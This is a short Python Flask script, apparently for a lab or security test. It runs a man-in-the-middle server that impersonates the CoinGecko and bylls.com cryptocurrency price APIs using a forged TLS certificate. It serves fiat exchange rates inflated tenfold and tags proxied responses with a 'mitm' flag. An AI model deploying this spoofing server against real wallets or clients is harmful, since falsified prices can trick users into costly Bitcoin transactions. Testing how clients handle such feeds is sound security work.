from flask import Flask, request, jsonify, send_from_directory
import requests
import os
import json

app = Flask(__name__)

@app.route('/')
def hello_world():
    return "This is a MITM server emulating https://api.coingecko.com/api/v3/exchange_rates/ and https://bylls.com/api/price?from_currency=BTC&to_currency=CAD"

#https://api.coingecko.com/api/v3/exchange_rates/
@app.route('/api/v3/exchange_rates')
def exchange_rates():
    return send_from_directory('/tmp', 'exchange_rates_10x.json')

@app.route('/api/price')
def get_price():
    from_currency = request.args.get('from_currency', 'BTC')
    to_currency = request.args.get('to_currency', 'CAD')

    # Build the URL
    url = f"https://bylls.com/api/price?from_currency={from_currency}&to_currency={to_currency}"

    try:
        # Send a GET request to the external API
        response = requests.get(url)
        response.raise_for_status()  # Raise an error for bad responses

        # Parse the JSON response from the external API
        data = response.json()

        # Add the "mitm" flag with the value "true" at the same level as "public_price"
        data['mitm'] = True

        # Return the modified JSON response
        return jsonify(data)

    except requests.exceptions.RequestException as e:
        return jsonify({'error': 'An error occurred while fetching data from the external API.'}), 500

def exchange_rates():
    return send_from_directory('/tmp', 'exchange_rates_10x.json')

if __name__ == '__main__':

    output_file_path = '/tmp/exchange_rates_10x.json'
    if not os.path.exists(output_file_path):
        # Fetch exchange rates data
        url = "https://api.coingecko.com/api/v3/exchange_rates"
        response = requests.get(url)
        exchange_rates = response.json()

        # Process the data
        for key, value in exchange_rates['rates'].items():
            if value['type'] == "fiat":
                value['value'] *= 10

        # Save the processed data to a file
        with open(output_file_path, 'w') as output_file:
            json.dump(exchange_rates, output_file, indent=4)

        print("Data fetched and processed successfully.")
    else:
        print(f"{output_file_path} already exists. Skipping data fetch and processing.")


    certfile = '/certificates/bylls.com.MITM.crt'
    keyfile = '/certificates/MITM.key'
    app.run(ssl_context=(certfile, keyfile), host='192.168.99.3', port=443, debug=True)
